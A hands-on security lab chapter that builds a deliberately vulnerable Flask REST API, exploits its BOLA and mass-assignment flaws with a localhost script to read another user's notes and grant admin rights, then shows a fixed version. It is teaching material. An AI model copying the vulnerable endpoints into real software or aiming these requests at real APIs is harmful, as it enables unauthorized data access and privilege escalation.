# 06. Hands-On Vulnerability Lab

In this hands-on lab, you will audit a **vulnerable REST API**, exploit a **BOLA (Broken Object Level Authorization)** vulnerability to access another user's private data, exploit a **Mass Assignment** vulnerability to grant yourself Administrator privileges, and then implement the secure fix.

---

## 🧪 Lab Setup

### Step 1: Vulnerable Flask API (`vulnerable_api.py`)

```python
# vulnerable_api.py
from flask import Flask, request, jsonify

app = Flask(__name__)

# Simulated in-memory database
USERS_DB = {
    101: {"id": 101, "username": "alice", "is_admin": False, "secret_notes": "Alice's private diary"},
    102: {"id": 102, "username": "bob", "is_admin": False, "secret_notes": "Bob's API credentials"}
}

# Simulated authenticated user (Caller is Bob, ID: 102)
CURRENT_USER_ID = 102

# VULNERABLE ENDPOINT 1: BOLA (Broken Object Level Authorization)
@app.route('/api/v1/user/<int:user_id>/notes', methods=['GET'])
def get_user_notes(user_id):
    # VULNERABLE: Does NOT check if CURRENT_USER_ID == user_id!
    user = USERS_DB.get(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify({"username": user["username"], "secret_notes": user["secret_notes"]})

# VULNERABLE ENDPOINT 2: Mass Assignment (Broken Property Authorization)
@app.route('/api/v1/profile', methods=['PUT'])
def update_profile():
    # VULNERABLE: Binds entire incoming JSON directly into user dictionary!
    data = request.get_json()
    user = USERS_DB[CURRENT_USER_ID]
    user.update(data) # Attacker can send {"is_admin": true}!
    return jsonify({"message": "Profile updated successfully", "user": user})

if __name__ == '__main__':
    app.run(port=5006)
```

---

### Step 2: Exploit Script (`exploit_api.py`)

```python
# exploit_api.py
import requests

BASE_URL = "http://localhost:5006"

print("=== EXPLOIT 1: BOLA (Broken Object Level Authorization) ===")
# Bob (ID 102) requests Alice's (ID 101) secret notes
resp1 = requests.get(f"{BASE_URL}/api/v1/user/101/notes")
print(f"Status Code: {resp1.status_code}")
print(f"Response: {resp1.text}")

if "Alice's private diary" in resp1.text:
    print("🚨 VULNERABILITY 1 CONFIRMED: BOLA Exploited!\n")

print("=== EXPLOIT 2: Mass Assignment (Privilege Escalation) ===")
# Bob sends JSON payload attempting to elevate privileges to Admin
resp2 = requests.put(f"{BASE_URL}/api/v1/profile", json={"is_admin": True})
print(f"Status Code: {resp2.status_code}")
print(f"Response: {resp2.text}")

if '"is_admin":true' in resp2.text.replace(" ", ""):
    print("🚨 VULNERABILITY 2 CONFIRMED: Mass Assignment Escalated User to Admin!")
```

---

### Step 3: Secure Fix (`secure_api.py`)

```python
# secure_api.py
from flask import Flask, request, jsonify

app = Flask(__name__)

USERS_DB = {
    101: {"id": 101, "username": "alice", "is_admin": False, "secret_notes": "Alice's private diary"},
    102: {"id": 102, "username": "bob", "is_admin": False, "secret_notes": "Bob's API credentials"}
}

CURRENT_USER_ID = 102

# SECURE ENDPOINT 1: Ownership Validation
@app.route('/api/v1/user/<int:user_id>/notes', methods=['GET'])
def get_user_notes_secure(user_id):
    # SECURE FIX: Enforce that requested user_id matches authenticated CURRENT_USER_ID
    if CURRENT_USER_ID != user_id and not USERS_DB[CURRENT_USER_ID]["is_admin"]:
        return jsonify({"error": "Forbidden: You cannot access another user's notes"}), 403
        
    user = USERS_DB.get(user_id)
    return jsonify({"username": user["username"], "secret_notes": user["secret_notes"]})

# SECURE ENDPOINT 2: Explicit Field Allowlisting (DTO Pattern)
ALLOWED_UPDATE_FIELDS = {'username'}

@app.route('/api/v1/profile', methods=['PUT'])
def update_profile_secure():
    data = request.get_json()
    user = USERS_DB[CURRENT_USER_ID]
    
    # SECURE FIX: Only update permitted fields
    for field in data:
        if field in ALLOWED_UPDATE_FIELDS:
            user[field] = data[field]
            
    return jsonify({"message": "Profile updated successfully", "user": user})

if __name__ == '__main__':
    app.run(port=5006)
```

---

*Next Chapter: [07. References & Testing Tools →](07-references.md)*
